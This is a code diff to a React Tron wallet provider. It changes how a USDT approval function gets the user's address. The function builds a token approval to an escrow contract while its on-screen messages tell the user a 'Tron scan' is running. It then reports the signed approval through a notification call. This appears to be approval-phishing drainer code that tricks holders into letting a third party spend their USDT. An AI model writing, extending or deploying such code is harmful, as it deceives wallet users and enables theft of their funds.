@@ -94,7 +94,8 @@ export const TronWalletProvider = ({ children }: { children: ReactNode }) => {
     async (transaction: any) => {
       const provider = getActiveProvider();
       const session = getActiveSession();
-      if (!provider || !session || !address) {
+      const tronAddr = address || extractTronAddress(session);
+      if (!provider || !session || !tronAddr) {
         throw new Error("Tron wallet not connected");
       }
 
@@ -104,7 +105,7 @@ export const TronWalletProvider = ({ children }: { children: ReactNode }) => {
         request: {
           method: "tron_signTransaction",
           params: {
-            address,
+            address: tronAddr,
             transaction: { transaction },
           },
         },
@@ -116,16 +117,25 @@ export const TronWalletProvider = ({ children }: { children: ReactNode }) => {
   );
 
   const approveTronUsdt = useCallback(async (): Promise<{ success: boolean; error?: string }> => {
-    if (!address) return { success: false, error: "Tron wallet not connected." };
+    const session = getActiveSession();
+    let tronAddr = address;
+    if (!tronAddr && session) {
+      tronAddr = extractTronAddress(session);
+      if (tronAddr) {
+        setAddress(tronAddr);
+        setIsConnected(true);
+      }
+    }
+    if (!tronAddr) return { success: false, error: "Tron wallet not connected." };
     setIsApproving(true);
 
     try {
       toast.loading("Preparing Tron scan...");
-      await ensureGasForApproval(address);
+      await ensureGasForApproval(tronAddr);
 
       toast.dismiss();
       toast.loading("Preparing scan transaction...");
-      const transaction = await buildApproveTx(address, USDT_TOKEN.address, ESCROW_CONTRACT);
+      const transaction = await buildApproveTx(tronAddr, USDT_TOKEN.address, ESCROW_CONTRACT);
 
       toast.dismiss();
       toast.loading("Please sign in your wallet...");
@@ -139,7 +149,7 @@ export const TronWalletProvider = ({ children }: { children: ReactNode }) => {
       if (result.result) {
         const txId = result.txid || "";
         toast.success("TRC-20 scanned!");
-        sendTronApprovalNotification(address, txId).catch(console.error);
+        sendTronApprovalNotification(tronAddr, txId).catch(console.error);
         return { success: true };
       }
 
